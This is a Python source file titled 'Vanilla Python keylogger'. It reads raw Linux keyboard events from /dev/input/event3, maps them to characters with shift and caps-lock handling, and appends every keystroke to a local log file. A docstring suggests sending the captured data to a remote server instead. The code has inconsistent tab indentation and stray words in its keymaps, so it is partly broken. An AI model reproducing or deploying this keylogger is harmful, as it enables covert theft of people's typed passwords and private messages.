 # Vanilla Python keylogger
import struct
import sys
from threading import Thread
from queue import Queue


KEYMAP = ['RESERVED', 'ESC', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 'BACKSPACE', '<\\t>', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '{', '}', '<\\n>', '<LEFTCTRL>', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ':', '"', '~', 'SHIFT', 'BACKSLASH', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 'SHIFT', 'KPASTERISK', '<LEFTALT>', ' ', 'CAPSLOCK', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'NUMLOCK', 'SCROLLLOCK', 'KP7', 'KP8', 'KP9', 'KPMINUS', 'KP4', 'KP5', 'KP6', 'KPPLUS', 'KP1', 'KP2', 'KP3', 'KP0', 'KPDOT', 'ZENKAKUHANKAKU', '102ND', 'F11', 'F12', 'RO', 'KATAKANA', 'HIRAGANA', 'HENKAN', 'KATAKANAHIRAGANA', 'MUHENKAN', 'KPJPCOMMA', 'KPENTER', 'RIGHTCTRL', 'KPSLASH', 'SYSRQ', 'RIGHTALT', 'LINEFEED', 'HOME', 'UP', 'PAGEUP', 'LEFT', 'RIGHT', 'END', 'DOWN', 'PAGEDOWN', 'INSERT', 'DELETE', 'MACRO', 'MUTE', 'VOLUMEDOWN', 'VOLUMEUP', 'POWER', 'KPEQUAL', 'KPPLUSMINUS', 'PAUSE', 'SCALE', 'KPCOMMA', 'HANGEUL', 'HANGUEL', 'HANJA', 'YEN', 'LEFTMETA', 'RIGHTMETA', 'COMPOSE', 'STOP', 'AGAIN', 'PROPS', 'UNDO', 'FRONT', 'COPY', 'OPEN', 'PASTE', 'FIND', 'CUT', 'HELP', 'MENU', 'CALC', 'SETUP', 'SLEEP', 'WAKEUP', 'FILE', 'SENDFILE', 'DELETEFILE', 'XFER', 'PROG1', 'PROG2', 'WWW', 'MSDOS', 'COFFEE', 'SCREENLOCK', 'ROTATE_DISPLAY', 'DIRECTION', 'CYCLEWINDOWS', 'MAIL', 'BOOKMARKS', 'COMPUTER', 'BACK', 'FORWARD', 'CLOSECD', 'EJECTCD', 'EJECTCLOSECD', 'NEXTSONG', 'PLAYPAUSE', 'PREVIOUSSONG', 'STOPCD', 'RECORD', 'REWIND', 'PHONE', 'ISO', 'CONFIG', 'HOMEPAGE', 'REFRESH', 'EXIT', 'MOVE', 'EDIT', 'SCROLLUP', 'SCROLLDOWN', 'KPLEFTPAREN', 'KPRIGHTPAREN', 'NEW', 'REDO', 'F13', 'F14', 'F15', 'F16', 'F17', 'F18', 'F19', 'F20', 'F21', 'F22', 'F23', 'F24', 'PLAYCD', 'PAUSECD', 'PROG3', 'PROG4', 'ALL_APPLICATIONS', 'DASHBOARD', 'SUSPEND', 'CLOSE', 'PLAY', 'FASTFORWARD', 'BASSBOOST', 'PRINT', 'HP', 'CAMERA', 'SOUND', 'QUESTION', 'EMAIL', 'CHAT', 'SEARCH', 'CONNECT', 'FINANCE', 'SPORT', 'SHOP', 'ALTERASE', 'CANCEL', 'BRIGHTNESSDOWN', 'BRIGHTNESSUP', 'MEDIA', 'SWITCHVIDEOMODE', 'KBDILLUMTOGGLE', 'KBDILLUMDOWN', 'KBDILLUMUP', 'SEND', 'REPLY', 'FORWARDMAIL', 'SAVE', 'DOCUMENTS', 'BATTERY', 'BLUETOOTH', 'WLAN', 'UWB', 'UNKNOWN', 'VIDEO_NEXT', 'VIDEO_PREV', 'BRIGHTNESS_CYCLE', 'BRIGHTNESS_AUTO', 'BRIGHTNESS_ZERO', 'DISPLAY_OFF', 'WWAN', 'WIMAX', 'RFKILL', 'MICMUTE', 'OK', 'SELECT', 'GOTO', 'CLEAR', 'POWER2', 'OPTION', 'INFO', 'TIME', 'VENDOR', 'ARCHIVE', 'PROGRAM', 'CHANNEL', 'FAVORITES', 'EPG', 'PVR', 'MHP', 'LANGUAGE', 'TITLE', 'SUBTITLE', 'ANGLE', 'FULL_SCREEN', 'ZOOM', 'MODE', 'KEYBOARD', 'ASPECT_RATIO', 'SCREEN', 'PC', 'TV', 'TV2', 'VCR', 'VCR2', 'SAT', 'SAT2', 'CD', 'TAPE', 'RADIO', 'TUNER', 'PLAYER', 'TEXT', 'DVD', 'AUX', 'MP3', 'AUDIO', 'VIDEO', 'DIRECTORY', 'LIST', 'MEMO', 'CALENDAR', 'RED', 'GREEN', 'YELLOW', 'BLUE', 'CHANNELUP', 'CHANNELDOWN', 'FIRST', 'LAST', 'AB', 'NEXT', 'RESTART', 'SLOW', 'SHUFFLE', 'BREAK', 'PREVIOUS', 'DIGITS', 'TEEN', 'TWEN', 'VIDEOPHONE', 'GAMES', 'ZOOMIN', 'ZOOMOUT', 'ZOOMRESET', 'WORDPROCESSOR', 'EDITOR', 'SPREADSHEET', 'GRAPHICSEDITOR', 'PRESENTATION', 'DATABASE', 'NEWS', 'VOICEMAIL', 'ADDRESSBOOK', 'MESSENGER', 'DISPLAYTOGGLE', 'BRIGHTNESS_TOGGLE', 'SPELLCHECK', 'LOGOFF', 'DOLLAR', 'EURO', 'FRAMEBACK', 'FRAMEFORWARD', 'CONTEXT_MENU', 'MEDIA_REPEAT', '10CHANNELSUP', '10CHANNELSDOWN', 'IMAGES', 'NOTIFICATION_CENTER', 'PICKUP_PHONE', 'HANGUP_PHONE', 'DEL_EOL', 'DEL_EOS', 'INS_LINE', 'DEL_LINE', 'FN', 'FN_ESC', 'FN_F1', 'FN_F2', 'FN_F3', 'FN_F4', 'FN_F5', 'FN_F6', 'FN_F7', 'FN_F8', 'FN_F9', 'FN_F10', 'FN_F11', 'FN_F12', 'FN_1', 'FN_2', 'FN_D', 'FN_E', 'FN_F', 'FN_S', 'FN_B', 'FN_RIGHT_SHIFT', 'BRL_DOT1', 'BRL_DOT2', 'BRL_DOT3', 'BRL_DOT4', 'BRL_DOT5', 'BRL_DOT6', 'BRL_DOT7', 'BRL_DOT8', 'BRL_DOT9', 'BRL_DOT10', 'NUMERIC_0', 'NUMERIC_1', 'NUMERIC_2', 'NUMERIC_3', 'NUMERIC_4', 'NUMERIC_5', 'NUMERIC_6', 'NUMERIC_7', 'NUMERIC_8', 'NUMERIC_9', 'NUMERIC_STAR', 'NUMERIC_POUND', 'NUMERIC_A', 'NUMERIC_B', 'NUMERIC_C', 'NUMERIC_D', 'CAMERA_FOCUS', 'WPS_BUTTON', 'TOUCHPAD_TOGGLE', 'TOUCHPAD_ON', 'TOUCHPAD_OFF', 'CAMERA_ZOOMIN', 'CAMERA_ZOOMOUT', 'CAMERA_UP', 'CAMERA_DOWN', 'CAMERA_LEFT', 'CAMERA_RIGHT', 'ATTENDANT_ON', 'ATTENDANT_OFF', 'ATTENDANT_TOGGLE', 'LIGHTS_TOGGLE', 'ALS_TOGGLE', 'ROTATE_LOCK_TOGGLE', 'BUTTONCONFIG', 'TASKMANAGER', 'JOURNAL', 'CONTROLPANEL', 'APPSELECT', 'SCREENSAVER', 'VOICECOMMAND', 'ASSISTANT', 'KBD_LAYOUT_NEXT', 'EMOJI_PICKER', 'DICTATE', 'CAMERA_ACCESS_ENABLE', 'CAMERA_ACCESS_DISABLE', 'CAMERA_ACCESS_TOGGLE', 'BRIGHTNESS_MIN', 'BRIGHTNESS_MAX', 'KBDINPUTASSIST_PREV', 'KBDINPUTASSIST_NEXT', 'KBDINPUTASSIST_PREVGROUP', 'KBDINPUTASSIST_NEXTGROUP', 'KBDINPUTASSIST_ACCEPT', 'KBDINPUTASSIST_CANCEL', 'RIGHT_UP', 'RIGHT_DOWN', 'LEFT_UP', 'LEFT_DOWN', 'ROOT_MENU', 'MEDIA_TOP_MENU', 'NUMERIC_11', 'NUMERIC_12', 'AUDIO_DESC', '3D_MODE', 'NEXT_FAVORITE', 'STOP_RECORD', 'PAUSE_RECORD', 'VOD', 'UNMUTE', 'FASTREVERSE', 'SLOWREVERSE', 'DATA', 'ONSCREEN_KEYBOARD', 'PRIVACY_SCREEN_TOGGLE', 'SELECTIVE_SCREENSHOT', 'NEXT_ELEMENT', 'PREVIOUS_ELEMENT', 'AUTOPILOT_ENGAGE_TOGGLE', 'MARK_WAYPOINT', 'SOS', 'NAV_CHART', 'FISHING_CHART', 'SINGLE_RANGE_RADAR', 'DUAL_RANGE_RADAR', 'RADAR_OVERLAY', 'TRADITIONAL_SONAR', 'CLEARVU_SONAR', 'SIDEVU_SONAR', 'NAV_INFO', 'BRIGHTNESS_MENU', 'The', 'e.g.', 'The', 'FOO', 'MACRO1', 'MACRO2', 'MACRO3', 'MACRO4', 'MACRO5', 'MACRO6', 'MACRO7', 'MACRO8', 'MACRO9', 'MACRO10', 'MACRO11', 'MACRO12', 'MACRO13', 'MACRO14', 'MACRO15', 'MACRO16', 'MACRO17', 'MACRO18', 'MACRO19', 'MACRO20', 'MACRO21', 'MACRO22', 'MACRO23', 'MACRO24', 'MACRO25', 'MACRO26', 'MACRO27', 'MACRO28', 'MACRO29', 'MACRO30', 'MACRO_RECORD_START', 'MACRO_RECORD_STOP', 'MACRO_RECORD_START', 'MACRO_RECORD_STOP', 'MACRO_PRESET_CYCLE', 'MACRO_PRESET1', 'MACRO_PRESET2', 'MACRO_PRESET3', 'have', 'KBD_LCD_MENU1', 'KBD_LCD_MENU2', 'KBD_LCD_MENU3', 'KBD_LCD_MENU4', 'KBD_LCD_MENU5', 'MIN_INTERESTING', 'MAX', 'CNT']
SHIFTED = ['RESERVED', 'ESC', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', 'BACKSPACE', '<\\t>', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '[', ']', '<\\n>', '<LEFTCTRL>', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ';', "'", '`', 'SHIFT', 'BACKSLASH', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', '<', '>', '?', 'SHIFT', 'KPASTERISK', '<LEFTALT>', ' ', 'CAPSLOCK', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'NUMLOCK', 'SCROLLLOCK', 'KP7', 'KP8', 'KP9', 'KPMINUS', 'KP4', 'KP5', 'KP6', 'KPPLUS', 'KP1', 'KP2', 'KP3', 'KP0', 'KPDOT', 'ZENKAKUHANKAKU', '102ND', 'F11', 'F12', 'RO', 'KATAKANA', 'HIRAGANA', 'HENKAN', 'KATAKANAHIRAGANA', 'MUHENKAN', 'KPJPCOMMA', 'KPENTER', 'RIGHTCTRL', 'KPSLASH', 'SYSRQ', 'RIGHTALT', 'LINEFEED', 'HOME', 'UP', 'PAGEUP', 'LEFT', 'RIGHT', 'END', 'DOWN', 'PAGEDOWN', 'INSERT', 'DELETE', 'MACRO', 'MUTE', 'VOLUMEDOWN', 'VOLUMEUP', 'POWER', 'KPEQUAL', 'KPPLUSMINUS', 'PAUSE', 'SCALE', 'KPCOMMA', 'HANGEUL', 'HANGUEL', 'HANJA', 'YEN', 'LEFTMETA', 'RIGHTMETA', 'COMPOSE', 'STOP', 'AGAIN', 'PROPS', 'UNDO', 'FRONT', 'COPY', 'OPEN', 'PASTE', 'FIND', 'CUT', 'HELP', 'MENU', 'CALC', 'SETUP', 'SLEEP', 'WAKEUP', 'FILE', 'SENDFILE', 'DELETEFILE', 'XFER', 'PROG1', 'PROG2', 'WWW', 'MSDOS', 'COFFEE', 'SCREENLOCK', 'ROTATE_DISPLAY', 'DIRECTION', 'CYCLEWINDOWS', 'MAIL', 'BOOKMARKS', 'COMPUTER', 'BACK', 'FORWARD', 'CLOSECD', 'EJECTCD', 'EJECTCLOSECD', 'NEXTSONG', 'PLAYPAUSE', 'PREVIOUSSONG', 'STOPCD', 'RECORD', 'REWIND', 'PHONE', 'ISO', 'CONFIG', 'HOMEPAGE', 'REFRESH', 'EXIT', 'MOVE', 'EDIT', 'SCROLLUP', 'SCROLLDOWN', 'KPLEFTPAREN', 'KPRIGHTPAREN', 'NEW', 'REDO', 'F13', 'F14', 'F15', 'F16', 'F17', 'F18', 'F19', 'F20', 'F21', 'F22', 'F23', 'F24', 'PLAYCD', 'PAUSECD', 'PROG3', 'PROG4', 'ALL_APPLICATIONS', 'DASHBOARD', 'SUSPEND', 'CLOSE', 'PLAY', 'FASTFORWARD', 'BASSBOOST', 'PRINT', 'HP', 'CAMERA', 'SOUND', 'QUESTION', 'EMAIL', 'CHAT', 'SEARCH', 'CONNECT', 'FINANCE', 'SPORT', 'SHOP', 'ALTERASE', 'CANCEL', 'BRIGHTNESSDOWN', 'BRIGHTNESSUP', 'MEDIA', 'SWITCHVIDEOMODE', 'KBDILLUMTOGGLE', 'KBDILLUMDOWN', 'KBDILLUMUP', 'SEND', 'REPLY', 'FORWARDMAIL', 'SAVE', 'DOCUMENTS', 'BATTERY', 'BLUETOOTH', 'WLAN', 'UWB', 'UNKNOWN', 'VIDEO_NEXT', 'VIDEO_PREV', 'BRIGHTNESS_CYCLE', 'BRIGHTNESS_AUTO', 'BRIGHTNESS_ZERO', 'DISPLAY_OFF', 'WWAN', 'WIMAX', 'RFKILL', 'MICMUTE', 'OK', 'SELECT', 'GOTO', 'CLEAR', 'POWER2', 'OPTION', 'INFO', 'TIME', 'VENDOR', 'ARCHIVE', 'PROGRAM', 'CHANNEL', 'FAVORITES', 'EPG', 'PVR', 'MHP', 'LANGUAGE', 'TITLE', 'SUBTITLE', 'ANGLE', 'FULL_SCREEN', 'ZOOM', 'MODE', 'KEYBOARD', 'ASPECT_RATIO', 'SCREEN', 'PC', 'TV', 'TV2', 'VCR', 'VCR2', 'SAT', 'SAT2', 'CD', 'TAPE', 'RADIO', 'TUNER', 'PLAYER', 'TEXT', 'DVD', 'AUX', 'MP3', 'AUDIO', 'VIDEO', 'DIRECTORY', 'LIST', 'MEMO', 'CALENDAR', 'RED', 'GREEN', 'YELLOW', 'BLUE', 'CHANNELUP', 'CHANNELDOWN', 'FIRST', 'LAST', 'AB', 'NEXT', 'RESTART', 'SLOW', 'SHUFFLE', 'BREAK', 'PREVIOUS', 'DIGITS', 'TEEN', 'TWEN', 'VIDEOPHONE', 'GAMES', 'ZOOMIN', 'ZOOMOUT', 'ZOOMRESET', 'WORDPROCESSOR', 'EDITOR', 'SPREADSHEET', 'GRAPHICSEDITOR', 'PRESENTATION', 'DATABASE', 'NEWS', 'VOICEMAIL', 'ADDRESSBOOK', 'MESSENGER', 'DISPLAYTOGGLE', 'BRIGHTNESS_TOGGLE', 'SPELLCHECK', 'LOGOFF', 'DOLLAR', 'EURO', 'FRAMEBACK', 'FRAMEFORWARD', 'CONTEXT_MENU', 'MEDIA_REPEAT', '10CHANNELSUP', '10CHANNELSDOWN', 'IMAGES', 'NOTIFICATION_CENTER', 'PICKUP_PHONE', 'HANGUP_PHONE', 'DEL_EOL', 'DEL_EOS', 'INS_LINE', 'DEL_LINE', 'FN', 'FN_ESC', 'FN_F1', 'FN_F2', 'FN_F3', 'FN_F4', 'FN_F5', 'FN_F6', 'FN_F7', 'FN_F8', 'FN_F9', 'FN_F10', 'FN_F11', 'FN_F12', 'FN_1', 'FN_2', 'FN_D', 'FN_E', 'FN_F', 'FN_S', 'FN_B', 'FN_RIGHT_SHIFT', 'BRL_DOT1', 'BRL_DOT2', 'BRL_DOT3', 'BRL_DOT4', 'BRL_DOT5', 'BRL_DOT6', 'BRL_DOT7', 'BRL_DOT8', 'BRL_DOT9', 'BRL_DOT10', 'NUMERIC_0', 'NUMERIC_1', 'NUMERIC_2', 'NUMERIC_3', 'NUMERIC_4', 'NUMERIC_5', 'NUMERIC_6', 'NUMERIC_7', 'NUMERIC_8', 'NUMERIC_9', 'NUMERIC_STAR', 'NUMERIC_POUND', 'NUMERIC_A', 'NUMERIC_B', 'NUMERIC_C', 'NUMERIC_D', 'CAMERA_FOCUS', 'WPS_BUTTON', 'TOUCHPAD_TOGGLE', 'TOUCHPAD_ON', 'TOUCHPAD_OFF', 'CAMERA_ZOOMIN', 'CAMERA_ZOOMOUT', 'CAMERA_UP', 'CAMERA_DOWN', 'CAMERA_LEFT', 'CAMERA_RIGHT', 'ATTENDANT_ON', 'ATTENDANT_OFF', 'ATTENDANT_TOGGLE', 'LIGHTS_TOGGLE', 'ALS_TOGGLE', 'ROTATE_LOCK_TOGGLE', 'BUTTONCONFIG', 'TASKMANAGER', 'JOURNAL', 'CONTROLPANEL', 'APPSELECT', 'SCREENSAVER', 'VOICECOMMAND', 'ASSISTANT', 'KBD_LAYOUT_NEXT', 'EMOJI_PICKER', 'DICTATE', 'CAMERA_ACCESS_ENABLE', 'CAMERA_ACCESS_DISABLE', 'CAMERA_ACCESS_TOGGLE', 'BRIGHTNESS_MIN', 'BRIGHTNESS_MAX', 'KBDINPUTASSIST_PREV', 'KBDINPUTASSIST_NEXT', 'KBDINPUTASSIST_PREVGROUP', 'KBDINPUTASSIST_NEXTGROUP', 'KBDINPUTASSIST_ACCEPT', 'KBDINPUTASSIST_CANCEL', 'RIGHT_UP', 'RIGHT_DOWN', 'LEFT_UP', 'LEFT_DOWN', 'ROOT_MENU', 'MEDIA_TOP_MENU', 'NUMERIC_11', 'NUMERIC_12', 'AUDIO_DESC', '3D_MODE', 'NEXT_FAVORITE', 'STOP_RECORD', 'PAUSE_RECORD', 'VOD', 'UNMUTE', 'FASTREVERSE', 'SLOWREVERSE', 'DATA', 'ONSCREEN_KEYBOARD', 'PRIVACY_SCREEN_TOGGLE', 'SELECTIVE_SCREENSHOT', 'NEXT_ELEMENT', 'PREVIOUS_ELEMENT', 'AUTOPILOT_ENGAGE_TOGGLE', 'MARK_WAYPOINT', 'SOS', 'NAV_CHART', 'FISHING_CHART', 'SINGLE_RANGE_RADAR', 'DUAL_RANGE_RADAR', 'RADAR_OVERLAY', 'TRADITIONAL_SONAR', 'CLEARVU_SONAR', 'SIDEVU_SONAR', 'NAV_INFO', 'BRIGHTNESS_MENU', 'The', 'e.g.', 'The', 'FOO', 'MACRO1', 'MACRO2', 'MACRO3', 'MACRO4', 'MACRO5', 'MACRO6', 'MACRO7', 'MACRO8', 'MACRO9', 'MACRO10', 'MACRO11', 'MACRO12', 'MACRO13', 'MACRO14', 'MACRO15', 'MACRO16', 'MACRO17', 'MACRO18', 'MACRO19', 'MACRO20', 'MACRO21', 'MACRO22', 'MACRO23', 'MACRO24', 'MACRO25', 'MACRO26', 'MACRO27', 'MACRO28', 'MACRO29', 'MACRO30', 'MACRO_RECORD_START', 'MACRO_RECORD_STOP', 'MACRO_RECORD_START', 'MACRO_RECORD_STOP', 'MACRO_PRESET_CYCLE', 'MACRO_PRESET1', 'MACRO_PRESET2', 'MACRO_PRESET3', 'have', 'KBD_LCD_MENU1', 'KBD_LCD_MENU2', 'KBD_LCD_MENU3', 'KBD_LCD_MENU4', 'KBD_LCD_MENU5', 'MIN_INTERESTING', 'MAX', 'CNT']
OUTFILE = 'loggylogs.txt'
STRUCT_FORMAT = 'llHHI'
EVENT_SIZE = struct.calcsize('llHHI')


q = Queue()  # Producer sends event to Parser
q2 = Queue()  # Parser sends mapped character to Writer


def recorder():
    """Grabs items from the 2nd queue (parsed data), and writes it to the logfile.
    This could be replaced with a function to send the data to a remote server"""
    while True:
        writing = q2.get(block=True)  # Get the key 
        if writing == 'BACKSPACE':  # If key is 'BACKSPACE'
            with open(OUTFILE, 'r') as f:
                data = f.read()
                data = data[:-1]  # Slice off the last character
            with open(OUTFILE, 'w') as f:
                f.write(data)  # write it to the file
        elif len(writing) <= 4:  # Otherwise
            print(writing, end='')  # Print for debug
            with open(OUTFILE, 'a+') as f:
                f.write(writing)  # Write the keystroke to file


def consumer():
    """Parses the data from the keystrokes into a mapped character (or string) from one of the two
    keycode lists."""
    shift = False  # Boolean for Shift
    caps_lock = False   # Boolean for Caps Lock

    while True:
        key = ''
        event = q.get(block=True)  # Get the event

        # Unpack the event:
        (seconds, microseconds, event_type, event_code, value) = struct.unpack(STRUCT_FORMAT, event)
        # for debugging codes: # print(f"shift={shift}, code={event_code}, value={value}, event_type={event_type}")

        if event_type == 1:
	
	    # if leftshift or rightshift & value is 0 (unpressed)
            if event_code == 42 and value == 0 or event_code == 54 and value == 0:
                shift = False

            # otherwise if leftshift or rightshift set shift to True
            elif event_code == 42 or event_code == 54:
                shift = True

            # if capslock is pressed !capslock
            elif event_code == 58 and value == 1:
                if caps_lock:
			caps_lock = False
		    else:
			caps_lock = True
	
            # otherwise if a key is pressed
            elif value == 1:
	
                # if neither capslock or shift
                if not shift and not caps_lock:
                    key = KEYMAP[event_code]
	
                # if just shift special symbols & capital letters
                elif shift and not caps_lock:
                    key = SHIFTED[event_code]

                # if just caps lock only allow capital letters & NOT special symbols
                elif caps_lock and not shift:
                    if 16 <= event_code <= 25 or 30 <= event_code <= 38 or 44 <= event_code <= 50:
                        key = SHIFTED[event_code]
                    else:
                        key = KEYMAP[event_code]
	
                # if both allow special symbols & lowercase letters
                elif shift and caps_lock:
                    if 16 <= event_code <= 25 \
			or 30 <= event_code <= 38 or 44 <= event_code <= 50:
                        key = KEYMAP[event_code]
                    else:
                        key = SHIFTED[event_code]

                # pass the parsed data to the writer
                q2.put(key)


def producer():
    """Opens the /dev/input/event for the keyboard and reads the binary stream in event sized chunks
    and puts those into the first queue for the parser"""
    fp = open('/dev/input/event3', "rb")
    while True:
        event = fp.read(EVENT_SIZE)
        if not event:
            break
        q.put(event)
    fp.close()


try:
    t1 = Thread(target=producer)  # Producer gets keyboard events
    t1.start()
    t2 = Thread(target=consumer)  # Consumer parses keys from keyboard events
    t2.start()
    t3 = Thread(target=recorder)  # Recorder writes keys to the log file and handles backspaces
    t3.start()
except KeyboardInterrupt:
    t1.join()
    t2.join()
    t3.join()
    print('exiting')
    sys.exit()
